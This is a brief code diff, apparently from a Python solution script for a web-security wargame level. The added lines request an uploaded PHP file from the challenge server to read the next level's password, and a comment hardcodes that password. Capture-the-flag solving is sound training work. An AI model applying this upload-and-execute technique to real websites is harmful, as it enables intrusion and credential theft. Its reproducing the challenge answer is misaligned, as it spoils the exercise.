@@ -108,4 +108,10 @@ print(f'{div_content}\n')
 
 # get the upload path name using regex
 upload_dir = re.search(r'<a href="(upload/\w+.php)">', str(div_content)).group(1)
-print(upload_dir)
+print(f'{upload_dir}\n')
+
+
+# natas13 password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+response = session.get(URL + upload_dir)
+password = response.text.strip()
+print(f'natas13 password: {password}')
